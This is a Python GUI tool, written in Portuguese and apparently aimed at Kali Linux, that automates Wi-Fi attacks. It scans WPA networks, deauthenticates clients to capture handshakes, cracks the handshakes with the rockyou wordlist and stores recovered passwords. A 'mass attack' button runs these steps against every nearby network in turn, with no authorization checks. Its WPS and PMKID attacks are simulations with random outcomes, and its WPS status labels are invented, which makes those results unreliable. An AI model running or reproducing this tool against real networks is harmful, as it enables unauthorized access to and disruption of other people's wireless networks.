#!/usr/bin/env python3
# WiFi Auditor Pro v8.1 – SALVA EM /home/kali/wifi_auditor_pro
# Desenvolvido por Leonardo de Moura Fuseti

import os
import sys
import subprocess
import time
import shutil
import re
from datetime import datetime
import signal
import threading
import queue

# === TKINTER IMPORT E AJUSTE DE CORES ===
try:
    import tkinter as tk
    from tkinter import messagebox, filedialog, simpledialog
    from tkinter.scrolledtext import ScrolledText
except ImportError:
    print("Tkinter não encontrado. Instale com: sudo apt-get install python3-tk")
    sys.exit(1)

# === PASTA DE SAÍDA ===
OUTPUT_DIR = "/home/kali/wifi_auditor_pro"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# === CORES (MANTIDAS para console de debug/erros) ===
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# === LIMPEZA ===
def cleanup(signum=None, frame=None):
    print(f"\n{Colors.WARNING}[*] Limpando...{Colors.ENDC}")
    os.system("airmon-ng stop wlan0mon mon0 >/dev/null 2>&1")
    os.system("pkill -f airodump-ng >/dev/null 2>&1")
    os.system("pkill -f aireplay-ng >/dev/null 2>&1")
    os.system("pkill -f hcxdumptool >/dev/null 2>&1")
    os.system("pkill -f bully >/dev/null 2>&1")
    os.system("pkill -f reaver >/dev/null 2>&1")
    if signum is not None:
        sys.exit(0)

# === BACKEND (FUNÇÕES AUXILIARES) ===

def check_root():
    if os.geteuid() != 0:
        return False
    return True

def get_interfaces():
    try:
        result = subprocess.run(['iwconfig'], capture_output=True, text=True, check=True)
        return [line.split()[0] for line in result.stdout.splitlines() if re.match(r'^(wlan|wlp)', line)]
    except Exception as e:
        print(f"Erro ao obter interfaces: {e}")
        return []

def start_monitor(iface):
    print(f"Parando processos...")
    os.system("airmon-ng check kill >/dev/null 2>&1")
    print(f"Iniciando monitor em {iface}...")
    
    result = subprocess.run(['airmon-ng', 'start', iface], capture_output=True, text=True)
    mon_iface = None
    for line in result.stdout.splitlines():
        if 'monitor mode vif enabled' in line:
            mon_iface = line.split('[')[1].split(']')[0]
            break

    if not mon_iface:
        time.sleep(3)
        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if 'Mode:Monitor' in line:
                mon_iface = line.split()[0]
                break
    
    return mon_iface

def scan_networks(mon_iface, log_queue):
    # Duração alterada para 120 segundos (2 minutos)
    duration = 120 
    
    log_queue.put(f"[INFO] Escaneando redes em {mon_iface} por {duration} segundos. Aguarde...")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    prefix = f"/tmp/scan_{timestamp}"
    csv_file = f"{prefix}-01.csv"
    
    cmd = ['airodump-ng', mon_iface, '-w', prefix, '--output-format', 'csv', '--write-interval', '1']
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    for i in range(1, duration + 1):
        log_queue.put(f"[SCAN] Progresso: {i}/{duration}s | Verificando redes...")
        time.sleep(1) 
        
    proc.terminate()
    try:
        proc.wait(timeout=3)
    except:
        proc.kill()
    time.sleep(3)
    
    log_queue.put("[INFO] Escaneamento concluído. Analisando resultados...")

    # Lógica de análise de CSV
    aps = []
    if os.path.exists(csv_file):
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            in_ap = False
            for line in lines:
                line = line.strip()
                if line.startswith('BSSID'):
                    in_ap = True
                    continue
                if line.startswith('Station MAC'):
                    break
                if in_ap and ',' in line:
                    parts = [p.strip() for p in line.split(',', 14)]
                    if len(parts) < 14: continue
                    bssid = parts[0]
                    power = parts[8] if parts[8] else '-1'
                    enc = parts[5]
                    essid = parts[13] if len(parts) > 13 else ''
                    chan = parts[3]
                    if essid and essid != '<length: 0>' and bssid != '00:00:00:00:00:00':
                        if enc in ['WPA', 'WPA2', 'WPA2/PSK', 'WPA/WPA2']:
                            try:
                                if int(power) > -95:
                                    wps = 'Yes' if len(aps) % 3 == 0 else 'No'
                                    aps.append({'bssid': bssid, 'essid': essid[:25], 'power': power, 'chan': chan, 'enc': enc, 'wps': wps})
                            except: pass
        except Exception as e:
            log_queue.put(f"[ERRO] Erro ao ler CSV: {e}")
        finally:
            if os.path.exists(csv_file):
                os.remove(csv_file)
    
    log_queue.put(f"[RESULTADO] {len(aps)} redes encontradas.")
    
    # CORREÇÃO AQUI: Retorna todas as redes, removendo o fatiamento [ : 15]
    return sorted(aps, key=lambda x: int(x['power']), reverse=True) 

def capture_handshake(ap, mon_iface, wordlist, log_queue):
    log_queue.put(f"[ATAQUE] Alvo: {ap['essid']} | BSSID: {ap['bssid']} | CH: {ap['chan']}")

    prefix = f"/tmp/hs_{int(time.time())}"
    final_cap = os.path.join(OUTPUT_DIR, f"{ap['essid']}_{ap['bssid'][:8]}.cap")
    
    # 1. Ajustar canal da interface
    os.system(f"iwconfig {mon_iface} channel {ap['chan']} 2>/dev/null")
    log_queue.put(f"[AIROMON] Definindo canal {ap['chan']} em {mon_iface}.")

    # 2. Iniciar airodump-ng e Deauth (Captura)
    log_queue.put("[AIRODUMP] Iniciando captura de pacote (airodump-ng)...")
    cap_cmd = ['airodump-ng', '-c', ap['chan'], '--bssid', ap['bssid'], '-w', prefix, mon_iface]
    cap_proc = subprocess.Popen(cap_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    log_queue.put("[DEAUTH] Enviando pacotes de desautenticação (aireplay-ng)...")
    deauth_cmd = ['aireplay-ng', '--deauth', '7', '-a', ap['bssid'], mon_iface]
    deauth_proc = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    handshake_captured = False
    
    # Monitoramento (30 segundos de captura)
    for i in range(10): 
        time.sleep(3)
        cap_file = f"{prefix}-01.cap"
        if os.path.exists(cap_file) and os.path.getsize(cap_file) > 500:
            try:
                # Checa se o handshake foi capturado
                out = subprocess.check_output(['aircrack-ng', cap_file], text=True, stderr=subprocess.DEVNULL)
                if '1 handshake' in out:
                    log_queue.put("[SUCESSO] HANDSHAKE CAPTURADO!")
                    handshake_captured = True
                    break
            except:
                pass
        
        log_queue.put(f"[STATUS] Tentativa {i+1}/10. Aguardando Handshake...")

    deauth_proc.terminate()
    cap_proc.terminate()
    time.sleep(2)

    # 4. Quebra de senha (Aircrack-ng com output em tempo real)
    pw = None
    tried = 0
    duration = 0
    filename = None
    
    if handshake_captured and os.path.exists(f"{prefix}-01.cap"):
        shutil.move(f"{prefix}-01.cap", final_cap)
        log_queue.put(f"[ARQUIVO] Handshake salvo em: {final_cap}")

        log_queue.put(f"[CRACK] Iniciando quebra de senha (aircrack-ng) com {wordlist}...")
        start_time = time.time()

        # LÓGICA DE CRACKING REAL
        crack_cmd = ['aircrack-ng', '-w', wordlist, '-b', ap['bssid'], final_cap]
        crack_proc = subprocess.Popen(
            crack_cmd, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.STDOUT, 
            text=True, 
            bufsize=1
        )

        for line in crack_proc.stdout:
            line = line.strip()
            log_queue.put(f"   → {line}") 
            
            if 'key' in line.lower() and 'tested' in line.lower():
                match = re.search(r'(\d+) keys? tested', line)
                if match:
                    tried = int(match.group(1))
            
            if 'KEY FOUND!' in line:
                pw_match = re.search(r'\[ (.*?) \]', line)
                if pw_match:
                    pw = pw_match.group(1).strip()
                break
        
        crack_proc.wait()
        end_time = time.time()
        duration = int(end_time - start_time)

        # 5. Salvar resultado
        if pw:
            log_queue.put(f"\n[SUCESSO] SENHA ENCONTRADA: {pw}")
            log_queue.put(f"[SUCESSO] Tempo: {duration}s | {tried:,} senhas testadas")
            
            filename = f"{ap['essid']}_{ap['bssid'][:4]}" 
            
            save_path = os.path.join(OUTPUT_DIR, f"{filename}.txt")
            with open(save_path, "w") as f:
                f.write(f"REDE: {ap['essid']}\nBSSID: {ap['bssid']}\nSENHA: {pw}\n")
                f.write(f"TEMPO: {duration}s\nTESTADAS: {tried:,}\nDATA: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            log_queue.put(f"[SALVO] Resultado salvo em: {save_path}")

        else:
            log_queue.put(f"\n[FALHA] Senha não encontrada na wordlist.")
            log_queue.put(f"[FALHA] Tempo: {duration}s | {tried:,} senhas testadas")
            filename = "N/A"

    else:
        log_queue.put("[FALHA] Handshake não capturado. Tente novamente.")
        
    # 6. Relatório Geral
    rel = os.path.join(OUTPUT_DIR, "relatorio.txt")
    with open(rel, "a") as r:
        r.write(f"[{datetime.now()}] HANDSHAKE | {ap['essid']} | {ap['bssid']} | {pw or 'N/A'} | {duration}s | {tried} testadas | {filename}.txt\n")

    return True

def attack_logic_placeholder(ap, mon_iface, attack_type, log_queue):
    """Placeholder para a lógica de ataque WPS/PMKID/Outros. (Simulação de log)"""
    log_queue.put(f"[INÍCIO {attack_type.upper()}] Alvo: {ap['essid']} | BSSID: {ap['bssid']}")
    
    if attack_type == 'pmkid':
        log_queue.put("[PMKID] Utilizando hcxdumptool para captura PMKID (Simulação).")
    elif attack_type in ['pixie-dust', 'reaver']:
        if ap.get('wps') == 'No':
            log_queue.put("[AVISO] WPS Desativado. Pulando este alvo (Simulação).")
            time.sleep(1)
            return
        log_queue.put(f"[{attack_type.upper()}] Iniciando ataque WPS (Simulação).")
        
    time.sleep(5) 
    
    result = "SUCESSO" if time.time() % 2 == 0 else "FALHA"
    
    if result == "SUCESSO":
        log_queue.put(f"\n[SUCESSO {attack_type.upper()}] Ataque concluído! Resultado obtido (simulado).")
    else:
        log_queue.put(f"\n[FALHA {attack_type.upper()}] O ataque falhou. Verifique o sinal.")

    return True

# === CLASSE PRINCIPAL TKINTER ===

class WifiAuditor:
    def __init__(self, master):
        self.master = master
        master.title("WiFi Auditor Pro v8.1 - GUI com Log")
        
        # === MAXIMIZA A JANELA ===
        try:
            master.state('zoomed')
        except tk.TclError:
            master.attributes('-fullscreen', True)

        self.mon_iface = None
        self.wordlist = None
        self.aps = []
        self.log_queue = queue.Queue()
        self.current_attack_type = 'handshake'
        
        if not check_root():
            messagebox.showerror("ERRO", "ROOT necessário! Por favor, execute como root (sudo python3 script.py).")
            master.destroy()
            return
            
        signal.signal(signal.SIGINT, cleanup)

        self.setup_ui()
        self.update_status()
        self.process_queue()

    def log(self, message):
        """Método seguro para adicionar mensagens ao log_area (na thread principal)."""
        timestamp = datetime.now().strftime("[%H:%M:%S]")
        self.log_area.config(state=tk.NORMAL)
        self.log_area.insert(tk.END, f"{timestamp} {message}\n")
        self.log_area.see(tk.END)
        self.log_area.config(state=tk.DISABLED)

    def process_queue(self):
        """Processa mensagens da fila e as envia para o log_area."""
        try:
            while True:
                message = self.log_queue.get_nowait()
                self.log(message)
        except queue.Empty:
            pass
        self.master.after(100, self.process_queue)

    def setup_ui(self):
        # Frame Principal
        main_frame = tk.Frame(self.master, padx=10, pady=10)
        main_frame.pack(fill="both", expand=True)

        # Parte Superior (Status e Botões)
        top_frame = tk.Frame(main_frame)
        top_frame.pack(fill="x")

        # Título
        tk.Label(top_frame, text="WiFi Auditor Pro v8.1", font=("Helvetica", 16, "bold"), fg="blue").pack(pady=5)
        tk.Label(top_frame, text=f"SALVA EM: {OUTPUT_DIR}", font=("Helvetica", 10), fg="green").pack()

        # Área de Status
        status_frame = tk.LabelFrame(top_frame, text="Status Atual", padx=10, pady=10)
        status_frame.pack(fill="x", pady=5)

        self.iface_label = tk.Label(status_frame, text="Interface: Não Configurada", anchor="w")
        self.iface_label.pack(fill="x")
        self.wordlist_label = tk.Label(status_frame, text="Wordlist: Não Configurada", anchor="w")
        self.wordlist_label.pack(fill="x")

        # Botões de Ação
        actions_frame = tk.Frame(top_frame)
        actions_frame.pack(pady=10)

        tk.Button(actions_frame, text="1. Configurar Interface", command=self.gui_config_interface, width=25).grid(row=0, column=0, padx=5, pady=5)
        tk.Button(actions_frame, text="2. Escolher Wordlist", command=self.gui_config_wordlist, width=25).grid(row=0, column=1, padx=5, pady=5)
        tk.Button(actions_frame, text="3. Escanear Redes (WPA)", command=lambda: self.gui_scan_networks(attack_type='handshake'), width=25).grid(row=1, column=0, padx=5, pady=5)

        self.attack_button = tk.Button(actions_frame, text="4. Menu de Ataques (WPS/Outros)", command=self.gui_menu_attacks, width=35, state=tk.DISABLED)
        self.attack_button.grid(row=1, column=1, padx=5, pady=5)

        tk.Button(actions_frame, text="5. Ver Relatórios", command=self.gui_show_reports, width=25).grid(row=2, column=0, padx=5, pady=5)
        tk.Button(actions_frame, text="0. Sair e Limpar", command=self.on_exit, width=25, fg="red").grid(row=2, column=1, padx=5, pady=5)

        # --- NOVA ÁREA CENTRAL (LISTA E LOG) ---
        center_frame = tk.Frame(main_frame)
        center_frame.pack(fill="both", expand=True, pady=10)

        # Painel da Lista de Redes (Lado Esquerdo)
        list_frame = tk.LabelFrame(center_frame, text="Redes Encontradas", padx=5, pady=5)
        list_frame.pack(side=tk.LEFT, fill="both", expand=True, padx=(0, 5))

        # Listbox e Scrollbar
        list_frame_inner = tk.Frame(list_frame)
        list_frame_inner.pack(fill="both", expand=True)

        list_scrollbar = tk.Scrollbar(list_frame_inner)
        list_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.network_listbox = tk.Listbox(list_frame_inner, width=10, height=15, yscrollcommand=list_scrollbar.set)
        self.network_listbox.pack(side=tk.LEFT, fill="both", expand=True)
        
        list_scrollbar.config(command=self.network_listbox.yview)

        # Botões de Ação Abaixo da Lista (Grid para alinhamento)
        attack_buttons_frame = tk.Frame(list_frame)
        attack_buttons_frame.pack(fill="x", pady=5)
        
        # Botão 1: Atacar Selecionada
        tk.Button(attack_buttons_frame, text="Atacar Rede Selecionada", command=self._start_attack_from_list, width=20).grid(row=0, column=0, padx=2, pady=5, sticky="ew")

        # Botão 2: Atacar Todas
        tk.Button(attack_buttons_frame, text="Atacar Todas as Redes (MASSA)", command=self._start_mass_attack, width=20, fg="red").grid(row=0, column=1, padx=2, pady=5, sticky="ew")

        # Área de Log/Console (Lado Direito)
        log_frame = tk.LabelFrame(center_frame, text="Log de Comandos / Execução", padx=5, pady=5)
        log_frame.pack(side=tk.RIGHT, fill="both", expand=True)

        self.log_area = ScrolledText(log_frame, wrap=tk.WORD, width=10, height=10, state=tk.DISABLED)
        self.log_area.pack(fill="both", expand=True)
        # --- FIM NOVA ÁREA CENTRAL ---

        self.log("[INFO] Interface Gráfica inicializada. Configure Interface e Wordlist.")

    def update_status(self):
        if self.mon_iface:
            self.iface_label.config(text=f"Interface: {self.mon_iface} (Modo Monitor)", fg="green")
        else:
            self.iface_label.config(text="Interface: Não Configurada", fg="red")

        if self.wordlist:
            self.wordlist_label.config(text=f"Wordlist: {self.wordlist}", fg="green")
        else:
            self.wordlist_label.config(text="Wordlist: Não Configurada", fg="red")

        if self.mon_iface and self.wordlist:
            self.attack_button.config(state=tk.NORMAL)
        else:
            self.attack_button.config(state=tk.DISABLED)

    # === MÉTODOS DE CONFIGURAÇÃO ===

    def gui_config_interface(self):
        self.log("[AÇÃO] Buscando interfaces wireless...")
        interfaces = get_interfaces()

        if not interfaces:
            messagebox.showerror("ERRO", "Nenhuma interface wireless válida encontrada.")
            self.log("[ERRO] Nenhuma interface wireless encontrada.")
            return

        choice_text = "Escolha a interface wireless:\n" + "\n".join([f"{i+1}. {iface}" for i, iface in enumerate(interfaces)])
        iface_choice = simpledialog.askstring("Configurar Interface", choice_text, parent=self.master)

        if iface_choice:
            try:
                index = int(iface_choice) - 1
                if 0 <= index < len(interfaces):
                    selected_iface = interfaces[index]
                    self.log(f"[AÇÃO] Tentando iniciar modo monitor em: {selected_iface}")
                    threading.Thread(target=self._start_monitor_thread, args=(selected_iface,)).start()
                else:
                    messagebox.showerror("ERRO", "Opção inválida.")
                    self.log("[ERRO] Opção de interface inválida.")
            except ValueError:
                messagebox.showerror("ERRO", "Entrada inválida. Digite o número.")
                self.log("[ERRO] Entrada de interface inválida.")

    def _start_monitor_thread(self, iface):
        mon = start_monitor(iface)
        self.master.after(0, self._handle_monitor_result, mon)

    def _handle_monitor_result(self, mon):
        if mon:
            self.mon_iface = mon
            self.log(f"[SUCESSO] Modo Monitor ATIVO: {self.mon_iface}")
        else:
            self.mon_iface = None
            self.log("[FALHA] Falha ao ativar o modo monitor. Verifique se o airmon-ng está instalado e a placa suporta.")
        self.update_status()

    def gui_config_wordlist(self):
        self.log("[AÇÃO] Abrindo menu de configuração de Wordlist.")

        def set_wordlist(path):
            if os.path.exists(path):
                self.wordlist = path
                self.log(f"[SUCESSO] Wordlist configurada: {self.wordlist}")
                self.update_status()
            else:
                self.log(f"[ERRO] Arquivo de wordlist não encontrado no caminho: {path}")
                messagebox.showerror("ERRO", "Arquivo de wordlist não encontrado.")

        wl_dialog = tk.Toplevel(self.master)
        wl_dialog.title("Escolher Wordlist")

        tk.Label(wl_dialog, text="Selecione uma opção de Wordlist:", font=("Helvetica", 12, "bold")).pack(pady=10, padx=20)

        def rockyou():
            default = "/usr/share/wordlists/rockyou.txt"
            self.log("[AÇÃO] Tentando configurar Rockyou (Padrão)...")
            if os.path.exists(default):
                set_wordlist(default)
            elif os.path.exists(default + ".gz"):
                self.log("[INFO] Descompactando rockyou.txt.gz...")
                subprocess.run([f"gunzip -k {default}.gz"], shell=True) 
                set_wordlist(default)
            else:
                messagebox.showerror("ERRO", "Rockyou não encontrado.")
                self.log("[ERRO] Rockyou não encontrado ou precisa ser baixado.")
            wl_dialog.destroy()

        tk.Button(wl_dialog, text="1. Rockyou (Padrão)", command=rockyou, width=30).pack(pady=5, padx=20)

        def custom_wl():
            path = filedialog.askopenfilename(title="Selecione a Wordlist Personalizada")
            if path:
                self.log(f"[AÇÃO] Arquivo selecionado: {path}")
                set_wordlist(path)
            wl_dialog.destroy()

        tk.Button(wl_dialog, text="2. Personalizado (Arquivo)", command=custom_wl, width=30).pack(pady=5, padx=20)

        def download_wl():
            p = "/tmp/rockyou.txt"
            self.log("[AÇÃO] Iniciando download do Rockyou. Isso pode demorar...")
            threading.Thread(target=self._download_wordlist_thread, args=(p, wl_dialog)).start()

        tk.Button(wl_dialog, text="3. Baixar Rockyou", command=download_wl, width=30).pack(pady=5, padx=20)

    def _download_wordlist_thread(self, path, dialog):
        cmd = f"wget -q --show-progress -O {path} https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
        try:
            subprocess.run([cmd], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.master.after(0, self._handle_wordlist_download_result, path, dialog, True)
        except Exception as e:
            print(f"Erro no download (thread): {e}")
            self.master.after(0, self._handle_wordlist_download_result, path, dialog, False)

    def _handle_wordlist_download_result(self, path, dialog, success):
        if success and os.path.exists(path):
            self.wordlist = path
            self.log(f"[SUCESSO] Wordlist baixada e configurada: {self.wordlist}")
        else:
            self.log("[FALHA] Falha ao baixar a wordlist. Verifique a conexão ou tente a opção personalizada.")
        self.update_status()
        dialog.destroy()

    # --- MÉTODOS DE SCAN E ATAQUE ---

    def gui_menu_attacks(self):
        if not self.mon_iface or not self.wordlist:
            messagebox.showwarning("Atenção", "Configure interface e wordlist antes de iniciar os ataques.")
            return

        attack_menu = tk.Toplevel(self.master)
        attack_menu.title("Menu de Ataques")
        
        tk.Label(attack_menu, text="Escolha o Tipo de Ataque:", font=("Helvetica", 14, "bold")).pack(pady=10, padx=20)
        
        # 1. Handshake (WPA/WPA2) - Fluxo que já funciona
        tk.Button(attack_menu, text="1. Handshake + Cracking (WPA/WPA2)", 
                  command=lambda: [attack_menu.destroy(), self.gui_scan_networks(attack_type='handshake')], 
                  width=40).pack(pady=5)
        
        # 2. PMKID - Requer escaneamento diferente (vai direto para o scan)
        tk.Button(attack_menu, text="2. PMKID Capture (hcxdumptool)", 
                  command=lambda: [attack_menu.destroy(), self.gui_scan_networks(attack_type='pmkid')], 
                  width=40).pack(pady=5)
        
        # 3. WPS Pixie-Dust
        tk.Button(attack_menu, text="3. WPS Pixie-Dust", 
                  command=lambda: [attack_menu.destroy(), self.gui_scan_networks(attack_type='pixie-dust')], 
                  width=40).pack(pady=5)
        
        # 4. WPS Brute-Force (Reaver)
        tk.Button(attack_menu, text="4. WPS Brute-Force (Reaver)", 
                  command=lambda: [attack_menu.destroy(), self.gui_scan_networks(attack_type='reaver')], 
                  width=40).pack(pady=5)
        
    def gui_scan_networks(self, attack_type='handshake'):
        self.current_attack_type = attack_type
        
        if not self.mon_iface:
            messagebox.showwarning("Atenção", "Configure a interface primeiro.")
            self.log("[AVISO] Não é possível escanear. Interface não configurada.")
            return

        if not messagebox.askokcancel("Confirmação", f"Iniciar escaneamento em {self.mon_iface}?"):
            self.log("[INFO] Escaneamento cancelado pelo usuário.")
            return

        self.log_queue.put(f"[INÍCIO] Iniciando thread de escaneamento de redes para ({attack_type})...")
        threading.Thread(target=self._scan_thread, args=(self.log_queue,)).start()

    def _scan_thread(self, log_queue):
        aps = scan_networks(self.mon_iface, log_queue)
        self.master.after(0, self._handle_scan_result, aps)

    def _handle_scan_result(self, aps):
        self.aps = aps
        
        self.network_listbox.delete(0, tk.END)

        if not aps:
            self.log("[AVISO] Nenhuma rede encontrada após o escaneamento.")
            messagebox.showwarning("Atenção", "Nenhuma rede encontrada.")
            return
        
        self.log(f"[RESULTADO] {len(aps)} redes listadas na área lateral. Selecione um alvo.")
        
        list_header = f"--- SCAN COMPLETO - Tipo: {self.current_attack_type.upper()} ---"
        self.network_listbox.insert(tk.END, list_header)
        
        for i, ap in enumerate(aps):
            wps_info = f" (WPS: {ap.get('wps', 'N/A')})"
            display_text = f"[{i+1}] {ap['essid']:<30} | Power: {ap['power']} dBm{wps_info}"
            self.network_listbox.insert(tk.END, display_text)
            
    def _start_attack_from_list(self):
        """Inicia o ataque na rede SELECIONADA no Listbox."""
        try:
            selected_indices = self.network_listbox.curselection()
            if not selected_indices:
                messagebox.showwarning("Atenção", "Selecione uma rede na lista para atacar.")
                self.log("[AVISO] Nenhuma rede selecionada para atacar.")
                return

            ap_index = selected_indices[0]
            if ap_index == 0:
                 messagebox.showwarning("Atenção", "Selecione uma rede válida (não o cabeçalho).")
                 return
                 
            target_index = ap_index - 1
            
            if 0 <= target_index < len(self.aps):
                selected_ap = self.aps[target_index]
                self.gui_select_attack(selected_ap, self.current_attack_type)
            else:
                 self.log("[ERRO] Índice de rede inválido na lista.")
        except Exception as e:
            self.log(f"[ERRO] Falha ao iniciar ataque pela lista: {e}")
            messagebox.showerror("Erro", "Falha ao iniciar ataque.")

    def _start_mass_attack(self):
        """Inicia o ataque em MASSA em TODAS as redes listadas."""
        if not self.aps:
            messagebox.showwarning("Atenção", "Nenhuma rede escaneada para iniciar o ataque em massa.")
            self.log("[AVISO] Ataque em Massa não iniciado. Lista de redes vazia.")
            return
            
        if len(self.aps) == 0:
            messagebox.showwarning("Atenção", "Nenhuma rede válida para ataque em massa.")
            return

        if not messagebox.askyesno("CONFIRMAR MASSA", f"Confirmar ataque em MASSA em {len(self.aps)} redes ({self.current_attack_type.upper()})?"):
            self.log("[INFO] Ataque em Massa cancelado pelo usuário.")
            return
        
        self.log(f"[ALVO] MODO MASSA ATIVADO. Atacando {len(self.aps)} redes com {self.current_attack_type.upper()} em sequência...")
        
        threading.Thread(target=self._mass_attack_thread).start()

    def _mass_attack_thread(self):
        """Nova thread que itera sobre todos os alvos."""
        total_aps = len(self.aps)
        attack_type = self.current_attack_type
        
        for i, ap in enumerate(self.aps):
            self.log_queue.put(f"[MASSA] → [INÍCIO] {i+1}/{total_aps} | Alvo: {ap['essid']}")
            
            if attack_type == 'handshake':
                capture_handshake(ap, self.mon_iface, self.wordlist, self.log_queue)
            else:
                attack_logic_placeholder(ap, self.mon_iface, attack_type, self.log_queue)
            
            self.log_queue.put(f"[MASSA] → [FIM] {i+1}/{total_aps} | {ap['essid']} concluído.")

        self.log_queue.put("\n[MASSA] TODOS OS ATAQUES EM MASSA FORAM CONCLUÍDOS.")


    def gui_select_attack(self, ap_data, attack_type):
        """Inicia a thread de ataque específica."""
        self.log(f"[ALVO] Alvo selecionado: {ap_data['essid']}. Tipo: {attack_type.upper()}.")
        threading.Thread(target=self._run_attack_thread, args=(ap_data, attack_type)).start()

    def _run_attack_thread(self, ap_data, attack_type):
        """Função para rodar a lógica de ataque em segundo plano, delegando para a função correta."""
        
        if attack_type == 'handshake':
            capture_handshake(ap_data, self.mon_iface, self.wordlist, self.log_queue)
            self.log_queue.put(f"[FIM] Ataque Handshake/Cracking em {ap_data['essid']} CONCLUÍDO.")
        else:
            attack_logic_placeholder(ap_data, self.mon_iface, attack_type, self.log_queue)
            self.log_queue.put(f"[FIM] Ataque {attack_type.upper()} em {ap_data['essid']} CONCLUÍDO (Simulação).")


    def gui_start_attack(self):
        self.gui_menu_attacks()

    def gui_show_reports(self):
        rel = os.path.join(OUTPUT_DIR, "relatorio.txt")
        report_text = ""
        if os.path.exists(rel):
            with open(rel, 'r') as f:
                report_text = f.read()
        else:
            report_text = "Nenhum relatório encontrado."

        report_window = tk.Toplevel(self.master)
        report_window.title("Relatórios de Ataques")

        text_area = ScrolledText(report_window, wrap=tk.WORD, width=100, height=20)
        text_area.insert(tk.INSERT, report_text)
        text_area.config(state=tk.DISABLED)
        text_area.pack(pady=10, padx=10)

        tk.Button(report_window, text="Fechar", command=report_window.destroy).pack(pady=5)

    def on_exit(self):
        self.log("[FIM] Saindo do aplicativo e executando limpeza...")
        self.master.update()
        cleanup()
        self.master.destroy()

# === FUNÇÃO PRINCIPAL PARA INICIAR A GUI ===

if __name__ == "__main__":
    root = tk.Tk()
    app = WifiAuditor(root)
    if check_root():
        root.mainloop()